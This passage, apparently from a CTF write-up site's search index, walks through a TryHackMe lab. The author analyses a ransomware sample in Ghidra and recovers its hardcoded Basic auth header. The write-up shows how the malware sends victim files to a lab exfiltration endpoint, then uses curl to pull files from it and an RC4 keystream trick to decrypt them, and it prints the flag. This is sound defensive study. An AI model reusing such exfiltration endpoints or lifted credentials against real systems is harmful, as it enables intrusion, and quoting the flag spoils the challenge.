Importantly, this further string tells us that the service it is intended for is using basic authentication. A second header (<code>Content-Type: application/octet-stream</code>) is included in this function, indicating that this function is intended for use with a stream of data. Knowing that the first of these two headers is for use with a basic authentication scheme suggests that <code>cupid_agent</code> is likely to be a user, but the header would usually include a password as well. Looking at the Listing pane in Ghidra reveals a static string being stored in a pointer on the stack prior to the construction of the string object: </p> <p>Having found this, we can summise that the header being constructed by this <code>build_auth_header</code> function are: <pre><code>Authorization: Basic Y3VwaWRfYWdlbnQ6UjBzM3M0cjNSM2QhVjEwbDN0czRyM0JsdTMjMjAyNA==\nContent-Type: application/octet-stream\n</code></pre></p> <p><code>exfiltrate_files</code> The second of the component functions from <code>main</code> performs the main encryption process for a successful ransomware attack:  </p> <ul> <li>Enumerate the files in the working directory.</li> <li>Skip directories (so only files are included), already-encrypted files, and executables.</li> <li>For each file it finds, opens the file, reads it into memory, and sends it to the attacker server where it is encrypted.</li> <li>Per file, receives the encrypted equivalent back from the server and saves it to the local file system.</li> </ul> <p>The important part for this challenge is in the section that sends the files to the attacker server. Looking at this part of the function, we can see that the constructed header from the previous function is used in the request to the server. Furthermore, it identifies the address that the files are being sent to: </p> <p>Given that <code>0x1f90</code> is the hex representation of <code>8080</code>, we can infer that this means files are being sent to <code>http://api.valentinesforever.thm:8080/exfil</code>, complete with an authorization header, finally bringing us back to the original <code>nmap</code> and web enumeration findings.</p> <p><code>display_ransom_note</code> The final of the three functions that make up the <code>main</code> function is a simple note to display demanding some BitCoin. There's a wallet address here - this isn't much use to us right now (spoiler alert: it's not relevant).</p> <p>After adding the newly discovered domain to my <code>/etc/hosts</code> file, I sent a request to it on the 8080 port found in the executable, capturing it through Burp. Sending this request to Burp and adding the authorization header that I discovered in the <code>build_auth_header</code> function resulted in a response other than a <code>404</code>: </p> <p>Awesome, that proves the credentials are valid! It also suggests that somewhere in the pipeline, the files are being encrypted with RC4 - a stream cipher. Sadly, that response is the same when you send a request to the <code>/exfil</code> endpoint, so that leaves us with the question of what we're supposed to do with it. Looking back at the functions from the executable, I could see that there are calls to <code>printf</code>, suggesting this process could be running through some sort of command-line interface. With that in mind, I constructed a <code>curl</code> request to the endpoint and got a different response: </p> <p>We can now adapt our <code>curl</code> requests to download each of the files from the server to our local machine for inspection, using the following command: <code>curl http://api.valentinesforever.thm:8080/exfil/&lt;fileName&gt; -H 'Authorization: Basic Y3VwaWRfYWdlbnQ6UjBzM3M0cjNSM2QhVjEwbDN0czRyM0JsdTMjMjAyNA==' -o &lt;fileName&gt;</code></p>","tags":["tryhackme","ctf","easy","defensive","forensics","binary-analysis","scripting"]},{"location":"tryhackme/love_at_first_breach/advanced_track/task_1_loveletter.exe/#exfiltrated-files-downloaded-files-analysis","title":"Exfiltrated files downloaded files (analysis)","text":"<p>Running <code>file</code> on each of the files downloaded suggests them to be data files: </p> <p>Reading the headers for the files however reveals them to be encrypted at this point already: </p> <p>Thinking back to the response I got from the <code>api</code> endpoint, and more specifically about the RC4 stream cipher in use, it may be possible to recover the encrypted data on the server if the keystream in use to perform the encryption is static. This is because stream ciphers encrypt data by XOR'ing cleartext data with a keystream to produce ciphertext. All of that means that if we have a a file whose contents are known as well as the resulting ciphertext, the keystream should be able to be calculated. The keystream can then be used to decrypt other ciphertext from the same encrypting instance. Better still, if we can produce a file of null bytes, the file we have returned from the server will be the keystream exactly (due to the XOR operation - the opposite of the null byte will be the keystream character at the corresponding index position). With that in mind, the first thing to do is create a null byte file, preferably in a size larger than any of those observed on the server - this ensures the keystream is captured in full. We can do this with <code>dd</code>: <code>dd if=/dev/zero of=zeros.bin bs=1 count=8192</code> </p> <p>I then uploaded the file to the <code>exfil</code> endpoint, changing the <code>curl</code> request to include the <code>Content-Type</code> header found in the executable earlier and using a <code>POST</code> request: <code>curl http://api.valentinesforever.thm:8080/exfil -H 'Authorization: Basic Y3VwaWRfYWdlbnQ6UjBzM3M0cjNSM2QhVjEwbDN0czRyM0JsdTMjMjAyNA==' -H 'Content-Type: application/octet-stream' --data-binary @zeros.bin -o keystream.bin</code> </p> <p>To test the theory, I re-examined the file listing on the <code>exfil</code> endpoint and downloaded the new file amongst the list. As with the other scripting elements of this challenge, I generated a helper script that would perform the needed mathematical operations on the data(functioning): <pre><code>def xor_decrypt(cipher_path, keystream_path, output_path):\n    with open(cipher_path, \"rb\") as f:\n        cipher = f.read()\n\n    with open(keystream_path, \"rb\") as f:\n        keystream = f.read()\n\n    # repeat keystream if victim file longer\n    ks = (keystream * ((len(cipher) // len(keystream)) + 1))[:len(cipher)]\n\n    plain = bytes(c ^ k for c, k in zip(cipher, ks))\n\n    with open(output_path, \"wb\") as f:\n        f.write(plain)\n\n    print(\"Done:\", output_path)\n\n\nxor_decrypt(\"victim.enc\", \"keystream.bin\", \"victim.dec\")\n</code></pre></p> <p>Reading the contents of the newly decrpted file with <code>xxd</code> reveal a delightful loaf of null bytes, just like the original plaintext did. Now to see if the keystream is static! I tested it with the first file in the list, and the resulting file was a long stream of <code>A</code>s. Hmmm, maybe good, maybe bad. I went ahead and ran the rest of the files through the script before running <code>file</code> on the outputs:  </p> <p> </p> <p>Alright, nice. I decided to take a look at those files that aren't just very long lines of text, starting with the first in the list and hit gold with the required flag: </p> What is the value of the flag? <p>THM{l0v3_l3tt3r_fr0m_th3_90s_xoxo}</p>","tags":["tryhackme","ctf","easy","defensive","forensics","binary-analysis","scripting"]},{"location":"tryhackme/love_at_first_breach/advanced_track/task_1_loveletter.exe/#personal-note","title":"Personal note","text":"<p>I really enjoyed this challenge, despite the fact I didn't finish it within the time limit. I learned so much - new tricks with Developer Tools, got more confident with Ghidra, had an opportunity to examine Python scripts, consolidate my understanding of encryption a little - all while getting to see a very real-world example of a phishing &gt; full ransomware compromise end-to-end. The only thing I will say is that as a single task within a larger CTF, this feels like a long slog, but that doesn't take away any of the learning I got from it. I will definitely be looking for more of these sorts of rooms to work through in the future!</p> <p>Tools Used <code>Browser Developer Tools</code> <code>exiftool</code> <code>Ghidra</code> <code>python</code> <code>curl</code></p> <p>Date completed: 24/04/26 Date published: 24/04/26</p>","tags":["tryhackme","ctf","easy","defensive","forensics","binary-analysis","scripting"]}]}